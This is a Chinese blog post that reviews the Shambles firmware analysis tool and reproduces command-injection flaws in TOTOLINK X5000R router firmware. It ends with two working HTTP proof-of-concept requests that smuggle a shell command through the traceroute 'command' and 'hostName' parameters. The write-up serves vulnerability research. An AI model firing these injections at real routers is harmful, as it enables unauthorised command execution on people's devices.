# Shambles初体验&Totolink漏洞

# 起因

想找一个易上手、好看的UI、现代化的逆向工具，刷B站的时候看到了Shambles这个工具，便尝试使用一下。本篇文章主要介绍shambles上手体验以及Totolink漏洞复现及研究。[
作者水平有限，如有写错之处恳请指出]

# 上手体验

获得使用资格之后按照邮箱上的信息和授权码进行登录。[建议在良好的网络环境下使用]

![](https://image.3001.net/images/20230823/1692797476_64e60a24742fe81f8389a.png!small)

主页面分为本地和云端(上传)，本文先介绍上传云端的功能。

![image1](https://image.3001.net/images/20230823/1692797482_64e60a2a575b4e79af438.png!small)

点击上传并分析固件

本文所使用的固件信息:

厂商:totollink

型号:X5000R

大小:8.6MB

版本:V9.1.00u.6118

MD5:497788b96788270336160fec37d93660

指令集:MIPS

下载地址:
https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html

![image2](https://image.3001.net/images/20230823/1692797488_64e60a307dfbf26068e67.png!small)

点击生成报告，输入固件信息，[注意只演示如何操作，本文固件已上传完毕，可以在本地文件列表查看]

![image3](https://image.3001.net/images/20230823/1692797494_64e60a368c331f35dae97.png!small)

完成后界面会恢复到上传前的样子，不用担心，点击左上角 **浏览所有** 即可看到刚刚上传的固件。

![image4](https://image.3001.net/images/20230823/1692797498_64e60a3a226a8aaa9da8e.png!small)

等待解包完成即可

![](https://image.3001.net/images/20230823/1692797503_64e60a3f1213e66017f5b.png!small)

可以看到在云端固件列表中，已经有了分析报告[注意，目前shambles1.2.2版本在解包中可能由于有些字符串比较特殊或者比较多，打包的时候超出内存限制，导致解包出现错误]

486个高危31个中危，1825个低危，点击右侧的克隆至本地即可开始研究工作

点击左侧的本地文件

## 工作窗口

工作窗口分为4大板块，分别是工具栏，文件树，固件信息（主面板），漏洞列表

![](https://image.3001.net/images/20230823/1692797510_64e60a46386bcc76bb6f4.png!small)

同时还能够通过固件相似度可视化，发现相似固件，更方便于查找通杀漏洞

![](https://image.3001.net/images/20230823/1692797516_64e60a4cd2c88fb352061.png!small)

## Bindiff固件对比

![](https://image.3001.net/images/20230823/1692797526_64e60a569bbc81d35a21b.png!small)

使用Bindiff功能就能对比两个固件的自动化对比，具体功能可以查看下面的视频进行学习

https://www.bilibili.com/video/BV14V411V7ui/

## 虚拟机

当然，你还会注意到右侧的漏洞下还有虚拟机

[注：往常都是用QEMU来模拟环境进行测试，如果不知道如何用QEMU模拟环境可以查看这个视频

https://boschko.ca/qemu-emulating-firmware/]

没错！这个shambles还可以模拟固件环境，做到挖洞一站式体验

点击左上角的小箭头，切换到云端模式，再点击同步模拟器，等待ing

![](https://image.3001.net/images/20230823/1692797534_64e60a5e592a6f74caf8b.png!small)

具体的操作教程可以观看这个视频

https://www.bilibili.com/video/BV18g4y1j7KX/

## 挖洞

那么最令人心动的就是漏洞列表板块了，shambles能够自动挖掘潜在漏洞的信息并十分清晰地列出

在右侧可以看到具有命令执行的函数漏洞，双击函数便可以定位，F5可以将汇编代码调整为便于我们阅读的类C语言模式

![](https://image.3001.net/images/20230823/1692797541_64e60a6570b457158b923.png!small)

使用chatgpt3.5也可以进行验证  
![](https://image.3001.net/images/20230823/1692797547_64e60a6bade01cdedfc1a.png!small)

使用POC进行攻击

    
    
    POST /cgi-bin/cstecgi.cgi HTTP/1.1
    Host: 192.168.0.1
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 82
    Origin: http://192.168.0.1
    Connection: close
    Referer: http://192.168.0.1/advance/traceroute.html?time=1679125513355
    Cookie: SESSION_ID=2:1679122532:2
    
    {"command":"127.0.0.1; pwd > /tmp/1.txt;","num":"4","topicurl":"setTracerouteCfg"}
    

同样再选择一个漏洞

在setOpModeCfg中包含命令插入漏洞，该漏洞允许攻击者通过“hostName”参数执行任意命令

![](https://image.3001.net/images/20230823/1692797554_64e60a729aff68fbf72fb.png!small)

    
    
    POST /cgi-bin/cstecgi.cgi HTTP/1.1
    Host: 192.168.0.1
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 90
    Origin: http://192.168.0.1
    Connection: close
    Referer: http://192.168.0.1/advance/time.html?time=1679126798322
    Cookie: SESSION_ID=2:1679122532:2
    
    
    {
    "proto":"1",
    "hostName":"'; pwd > /tmp/1.txt;' ",
    "topicurl":"setOpModeCfg"
    }
    

参考资料：

https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/

